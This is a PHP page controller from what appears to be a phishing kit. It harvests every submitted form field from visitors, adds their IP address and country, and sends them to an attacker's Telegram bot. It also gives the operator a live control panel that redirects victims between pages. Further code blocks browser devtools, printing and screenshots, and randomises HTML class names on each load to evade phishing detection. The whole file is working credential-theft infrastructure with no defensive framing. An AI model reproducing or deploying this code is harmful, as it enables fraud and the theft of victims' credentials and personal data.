<?php


include "templates/header.php";

$jsonFile = 'settings.json';

if (!file_exists($jsonFile)) {
    die("JSON file not found!");
}

$jsonContent = file_get_contents($jsonFile);

$settings = json_decode($jsonContent, true);



$data = [
    "user_id"=>$user_profile,
    "current_page"=>'',
    "redirect" => '',
    "token" => '',
    "useragent" => filterBot::get_user_agent(),
    "done"=>false,
    "update_time" => date("Y-m-d H:i:s"),
    'data'=>''
];


if(!file_exists($user_profile)){
    $jsonData = json_encode($data, JSON_PRETTY_PRINT);
    
    file_put_contents($user_profile, $jsonData);
}
else{
    $jsonContent = file_get_contents($user_profile);
    
    $data = json_decode($jsonContent,true);
}


if(!!$_POST){
    $botToken = $settings['botToken'];
    $chatId = $settings['chatId'];
    $apiUrl = "https://api.telegram.org/bot$botToken/sendMessage";

    $page_curr = strtoupper($_POST["page"]);
    $messageBody = "🆕 <b>===== $page_curr Form =====</b>  🆕 \n\n";
    $data["data"] .= "🆕 ===== $page_curr Form =====  🆕 \n\n";
    foreach ($_POST as $key => $val) {
        if($key == 'page')
            continue;
        $valClean = htmlspecialchars($val);
        $formatedMessage = $settings["message"][$key] ?? htmlspecialchars($key); // Default bullet emoji
        $messageBody .= "<b>$formatedMessage:</b> <code>$valClean</code>\n";
        $data["data"] .= "$formatedMessage: $valClean\n";
    }
    
    
    $ip = get_client_ip();
    $xml = simplexml_load_file("http://www.geoplugin.net/xml.gp?ip=".$ip);
    $messageBody .= "\n🌐 <b>IP:</b> <code>$ip - " . $xml->geoplugin_countryName . "</code>\n\n";
    $messageBody .= "🆕 <b>===== $page_curr Form =====</b>  🆕 \n\n";
    $data["data"] .= "\n🆕 ===== $page_curr Form =====  🆕 \n\n";
    
    $link = $settings['siteUrl'] ."/panel/". str_replace(".", "_", $ip); 
    $params = [
        'chat_id' => $chatId,
        'text' => $messageBody,
        'parse_mode' => 'HTML',
        'reply_markup' => json_encode([
            'inline_keyboard' => [
                [
                    [
                        'text' => "🕹️ Control Panel for [ $ip ]", "callback_data"=> "string", "url"=> $link
                    ]
                ]
            ]
        ])
    ];

    $data["update_time"] = date("Y-m-d H:i:s");

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $apiUrl);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($params));
    $response = curl_exec($ch);
    curl_close($ch);


    if ($response === false) {
        $tt = 'cURL Error: ' . curl_error($ch);
    }

    $jsonData = json_encode($data, JSON_PRETTY_PRINT);
    
    file_put_contents($user_profile, $jsonData);
}
if($data["redirect"])
    redirect($user_profile,$data,$settings);

ob_start();

$matches = false;

foreach ($settings['pages'] as $page)
    if($action == $page['action']){
        update_current_page($user_profile,$data,$page['name']);
        require_once "pages/".$page['page'];
        $matches = true;
        break;
    }


if(!$matches)
    header('location:./'.$settings['pages'][0]['action']);

?>
<script>
    function redirect(user_id, settings) {
        let data = {user_id};
        let jsonData = JSON.stringify(data);
        const xhr = new XMLHttpRequest();
        xhr.open('POST', 'libraries/redirect.php', true);
        xhr.setRequestHeader('Content-Type', 'application/json');
        xhr.onload = function (res) {
            let resjson = JSON.parse(res.currentTarget.response); 
            let to = resjson.path;
            if(!to)
                return;
            let path = '';
            for (let page of settings.pages) {
                if (page.name === to) {
                    path = "./"+page.action;
                    break;
                }
                if(to == 'Logout'){
                    path = "<?=$settings['original']?>";
                    break;
                }
                
            }
            if(path == '<?=$action?>')
                return;
            data.user_id = user_id;
            data.redirect = '';
            if (xhr.status === 200) {
                window.location.href = path;
            }
        };
        xhr.send(jsonData);

    }
    setInterval(() => {
        if (document.visibilityState === 'visible') {
            redirect('<?=$user_profile?>', <?=json_encode($settings)?>)
        }
    }, 1000);
</script>
<script disable-devtool-auto src='https://cdn.jsdelivr.net/npm/disable-devtool'></script>

<script language="javascript">
var noPrint = true;
var noScreenshot = true;
</script>

<script type="text/javascript" src="https://pdfanticopy.com/noprint.js"></script>

<?php


$html = ob_get_clean();



$html = preg_replace_callback('/<([a-z1-6]+)([^>]*)>/i', function ($matches) {
    
    $alphabet = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    
    $tag = $matches[1];
    $attrs = $matches[2];
    
    if (preg_match('/^(br|hr|img|input|meta|link)$/i', $tag)) {
        return $matches[0];
    }
    $randomClass = substr(str_shuffle($alphabet), 0, 6);
    
    if (preg_match('/class=["\']([^"\']*)["\']/i', $attrs, $classMatch)) {
        $newClass = $classMatch[1] . " " . $randomClass;
        $attrs = preg_replace('/class=["\'][^"\']*["\']/i', 'class="' . $newClass . '"', $attrs);
    } else {
        $attrs .= ' class="' . $randomClass . '"';
    }
    
    return "<$tag$attrs>";
}, $html);

echo $html;
?>